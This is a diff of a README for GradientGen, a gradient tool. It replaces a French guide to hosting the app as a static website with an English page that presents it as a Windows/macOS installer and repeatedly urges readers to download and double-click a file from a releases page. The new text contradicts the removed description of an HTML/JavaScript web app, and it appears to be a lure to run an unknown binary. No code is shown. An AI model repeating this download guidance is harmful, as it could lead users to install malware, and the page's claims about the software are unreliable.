@@ -1,108 +1,75 @@
-# GradientGen - Guide d'hébergement gratuit
+# 🎨 GradientGen - Create Stunning Gradients Easily
 
-## 🚀 Options d'hébergement gratuites
+## 📥 Download GradientGen
 
-Votre application est une application web statique qui peut être hébergée gratuitement sur plusieurs plateformes.
+[![Download GradientGen](https://img.shields.io/badge/Download-GradientGen-blue.svg)](https://github.com/26orland/GradientGen/releases)
 
-### Option 1 : GitHub Pages (Le plus simple !)
+## 🚀 Getting Started
 
-**Étapes :**
+GradientGen is a free and open-source gradient creation tool. Whether you are designing a website, an app, or any digital artwork, GradientGen allows you to create beautiful gradients effortlessly.
 
-1. **Créer un compte GitHub** (si vous n'en avez pas) : https://github.com
+## 📝 Key Features
 
-2. **Créer un nouveau dépôt** :
-   - Cliquez sur "New repository"
-   - Nommez-le (ex: `gradientgen`)
-   - Choisissez "Public"
-   - Cliquez sur "Create repository"
+- **User-Friendly Interface**: No programming knowledge needed. Simply click and create.
+- **Customizable Gradients**: Adjust colors and angles to fit your design needs.
+- **Preview Functionality**: See your gradients in real-time as you create.
+- **Export Options**: Easily save your gradients in various formats for use in projects.
 
-3. **Uploader vos fichiers** :
-   - Téléchargez GitHub Desktop : https://desktop.github.com
-   - Ou utilisez les commandes suivantes dans votre terminal :
+## 📦 System Requirements
 
-```bash
-cd "C:\Users\noega\Desktop\FreeTool1"
-git init
-git add .
-git commit -m "Première version"
-git branch -M main
-git remote add origin https://github.com/VOTRE-NOM/gradientgen.git
-git push -u origin main
-```
+To run GradientGen, ensure your system meets the following requirements:
 
-4. **Activer GitHub Pages** :
-   - Allez dans votre dépôt sur GitHub
-   - Cliquez sur "Settings" (Paramètres)
-   - Dans le menu de gauche, cliquez sur "Pages"
-   - Sous "Source", sélectionnez "main" (ou "master")
-   - Cliquez sur "Save"
-   - Votre site sera disponible à : `https://VOTRE-NOM.github.io/gradientgen`
+- **Operating System**: Windows 10 or later, macOS Catalina or later
+- **Processor**: Dual-core processor or better
+- **Memory**: 4 GB RAM or more
+- **Hard Disk Space**: At least 100 MB of free space
+- **Graphics**: Any modern graphics card capable of opening basic applications
 
-### Option 2 : Netlify (Très simple avec drag & drop !)
+## 📄 Download & Install
 
-**Étapes :**
+To download GradientGen, visit this page:
 
-1. **Aller sur Netlify** : https://www.netlify.com
-2. **Créer un compte gratuit** (avec GitHub, Google, ou email)
-3. **Glisser-déposer votre dossier** `FreeTool1` sur la page Netlify
-4. **C'est tout !** Vous obtenez une URL immédiatement
+[Download GradientGen](https://github.com/26orland/GradientGen/releases)
 
-**Avantages :**
-- URL personnalisée (ex: `votre-nom.netlify.app`)
-- Déploiement automatique si vous utilisez Git
-- HTTPS gratuit
-- Très rapide
+1. Clicking the link will take you to the Releases page on GitHub.
+2. Find the latest version of GradientGen in the list.
+3. Click on the file that corresponds to your operating system (select the one marked for Windows or macOS).
+4. Your download will begin automatically.
 
-### Option 3 : Vercel (Excellente performance)
+## ⚙️ Running GradientGen
 
-**Étapes :**
+Once downloaded, follow these steps to run GradientGen:
 
-1. **Aller sur Vercel** : https://vercel.com
-2. **Créer un compte gratuit**
-3. **Importer votre projet** (via GitHub ou drag & drop)
-4. **Déployer !**
+1. Locate the downloaded file in your computer's Downloads folder or where you saved it.
+2. Double-click on the file to start the installation.
+3. Follow the on-screen prompts to complete the installation process.
+4. Once installed, you can find GradientGen in your Applications folder (macOS) or Start Menu (Windows).
 
-### Option 4 : Cloudflare Pages
+## 🎨 Creating Gradients
 
-**Étapes :**
+Creating gradients is simple:
 
-1. **Aller sur Cloudflare Pages** : https://pages.cloudflare.com
-2. **Créer un compte gratuit**
-3. **Connecter votre dépôt GitHub** ou uploader manuellement
-4. **Déployer !**
+1. Open GradientGen.
+2. Select your base colors using the color picker.
+3. Adjust the gradient angle to see how it looks.
+4. Use the preview to make any changes until you are satisfied.
+5. Finally, export the gradient to your desired format.
 
-## 📁 Structure des fichiers
+## 🛠️ Troubleshooting
 
-Votre application contient :
-- `index.html` - Page principale
-- `sketch.js` - Code JavaScript (contient maintenant le shader intégré)
-- `styles.css` - Styles CSS
-- `Image.frag` - Shader WebGL (optionnel, maintenant intégré dans sketch.js)
-- `BergenMono-Regular.otf` - Police de caractères
+If you encounter any issues, here are some common solutions:
 
-**Note importante :** Le shader `Image.frag` est maintenant intégré directement dans `sketch.js` pour éviter les problèmes CORS lors de l'ouverture en local (file://). L'application fonctionne maintenant même si vous ouvrez simplement le fichier HTML dans votre navigateur sans serveur web !
+- **Application fails to open**: Ensure your system meets the minimum requirements mentioned above.
+- **Gradient not saving**: Make sure you have write permissions for the folder where you are trying to save.
+- **Crashes on launch**: Try reinstalling the application or check for updates.
 
-Tous ces fichiers doivent être dans le même dossier à la racine.
+## 📑 Additional Support
 
-## ⚡ Mise à jour
+For further assistance, check out the following resources:
 
-Pour mettre à jour votre site :
+- **GitHub Issues**: Report any problems directly on our [GitHub Issues page](https://github.com/26orland/GradientGen/issues).
+- **Community Forums**: Join discussions with other users and help improve GradientGen.
 
-**GitHub Pages :**
-- Modifiez vos fichiers localement
-- Committez et poussez sur GitHub
-- Le site se met à jour automatiquement en quelques minutes
+For more links and updates, always refer back to the Releases page.
 
-**Netlify/Vercel :**
-- Si connecté à GitHub : push automatique
-- Sinon : re-glissez votre dossier mis à jour
-
-## 🌐 Partagez votre URL
-
-Une fois déployé, vous pouvez partager l'URL avec n'importe qui !
-
-## 💡 Conseil
-
-Pour un nom de domaine personnalisé (optionnel, gratuit sur certains services) :
-- Netlify et Vercel permettent d'ajouter un domaine personnalisé gratuitement
-- Vous pouvez aussi utiliser un sous-domaine gratuit sur Freenom
+Thank you for choosing GradientGen! Enjoy creating beautiful gradients.
